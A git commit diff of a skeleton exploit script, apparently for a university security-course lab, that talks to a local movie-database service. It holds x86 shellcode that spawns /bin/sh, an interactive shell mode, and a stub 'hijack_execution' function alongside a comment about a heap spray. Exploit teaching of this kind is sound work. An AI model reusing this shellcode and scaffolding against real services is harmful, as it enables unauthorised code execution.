0c68c14b63a4b85bdaa059a3490f0c09d5504885
James Mack <jdmack@ucsd.edu>
2014-05-09 17:56:54 -0700

    Commenting, add some functions

--- pp2/sploit.py
+++ pp2/sploit.py
@@ -2,39 +2,61 @@
 from sock import *
 import sys
 import time
-################################################################
-# Skeleton exploit for use                                     #
-# Uses a nice socket library (https://github.com/hellman/sock/)#
-# Actually read this ans feel free to modify!                  #
-################################################################
 
+###############################################################################
+#
+#   Skeleton exploit for use                                                  #
+#   Uses a nice socket library (https://github.com/hellman/sock/)             #
+#   Actually read this ans feel free to modify!                               #
+#
+###############################################################################
 
-# Change this to the attack host to get your key
 HOST = "localhost"
-
-# This should be your port number
 PORT = "55000"
 
 # Some useful shellcode (Not Aleph One's, but it does exec \bin\sh)
 SHELLCODE = "\x6a\x0b\x58\x99\x52\x68\x2f\x2fsh\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 
-# A useful function to wait for the user to press enter, that way you can put in pause points easily
+################################################################################
+#
+#   pause_script
+#
+#   A useful function to wait for the user to press enter, that way you can 
+#   put in pause points easily
+#
+################################################################################
 def pause_script():
-    raw_input("Paused... Press enter to continue")
+    raw_input("Paused... Press enter to continue: ")
 
+################################################################################
+#
+#   connect
+#
+################################################################################
 def connect():
-    con = Sock(HOST+":"+PORT)
+    con = Sock(HOST + ":" + PORT)
     return con
 
-# This will clear the read buffer and print all of it
+################################################################################
+#
+#   clear_read_buffer
+#
+#   This will clear the read buffer and print all of it
+#
+################################################################################
 def clear_read_buffer(con):
     r = con.read_one(0)
     while len(r) > 0:
         print r
         r = con.read_one(0)
 
-
-# This will remove a movie, and tell you success
+################################################################################
+#
+#   remove_movie
+#
+#   This will remove a movie, and tell you success
+#
+################################################################################
 def remove_movie(title,con):
     # Choose the remove option from the main menu
     con.send_line("d")
@@ -57,7 +79,13 @@ def remove_movie(title,con):
     # Did we delete the movie?
     return "Removed movie!" in resp
 
-# This will add a movie
+################################################################################
+#
+#   send_movie
+#
+#   This will add a movie
+#
+################################################################################
 def send_movie(movie,con):
     # Choose the add option
     con.send_line("a")
@@ -80,31 +108,57 @@ def send_movie(movie,con):
     con.send_line(movie["composer"])
     con.send_line(movie["average_rating"])
 
-# Switches to an interactive mode, good for shells maybe
-# You can't get out of interactive mode
+################################################################################
+#
+#   go_interactive
+#
+#   Switches to an interactive mode, good for shells maybe
+#   You can't get out of interactive mode
+#
+################################################################################
 def go_interactive(con):
     while True:
         time.sleep(1)
         print con.read_one(0)
         con.write(sys.stdin.readline())
 
-# Here is an example:
-hacker = {"title":"Hackers",
-          "director":"Iain Softley",
-          "star1":"Jonny Lee Miller",
-          "star2":"Angelina Jolie",
-          "star3":"Jessie Bradford",
-          "star4":"Matthew Lillard",
-          "star5":"Laurence Mason",
-          "summary":"A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
-          "country":"USA",
-          "budget":"UNK",
-          "opening_weekend":"UNK",
-          "gross":"$7,564,000",
-          "runtime":"107 min",
-          "aspect":"2.35 : 1",
-          "composer":"Someone",
-          "average_rating":"5.0"}
+################################################################################
+#
+#   hijack_execution
+#
+################################################################################
+def hijack_execution(con):
+
+    movie_title = "Hackers"
+    # Delete the movie
+    if remove_movie(movie_title, con):
+        print "Deleted!"
+    else:
+        print "Didn't delete :("
+
+
+################################################################################
+#
+#   Main
+#
+################################################################################
+
+hacker = {"title" : "Hackers",
+          "director" : "Iain Softley",
+          "star1" : "Jonny Lee Miller",
+          "star2" : "Angelina Jolie",
+          "star3" : "Jessie Bradford",
+          "star4" : "Matthew Lillard",
+          "star5" : "Laurence Mason",
+          "summary" : "A young boy is arrested by the US Secret Service for writing a computer virus and is banned from using a computer until his 18th birthday. Years later, he and his new-found friends discover a plot to unleash a dangerous computer virus, but they must use their computer skills to find the evidence while being pursued by the Secret Service and the evil computer genius behind the virus.",
+          "country" : "USA",
+          "budget" : "UNK",
+          "opening_weekend" : "UNK",
+          "gross" : "$7,564,000",
+          "runtime" : "107 min",
+          "aspect" : "2.35 : 1",
+          "composer" : "Someone",
+          "average_rating" : "5.0"}
 
 # Start the connection
 con = connect()
@@ -113,10 +167,8 @@ con = connect()
 pause_script()
 
 # Send the movie
-send_movie(hacker,con)
+send_movie(hacker, con)
 
-# Delete the movie
-if remove_movie("Hackers",con):
-    print "Deleted!"
-else:
-    print "Didn't delete :("
+# Create reviews to amplify the spray
+
+hijack_execution(con)
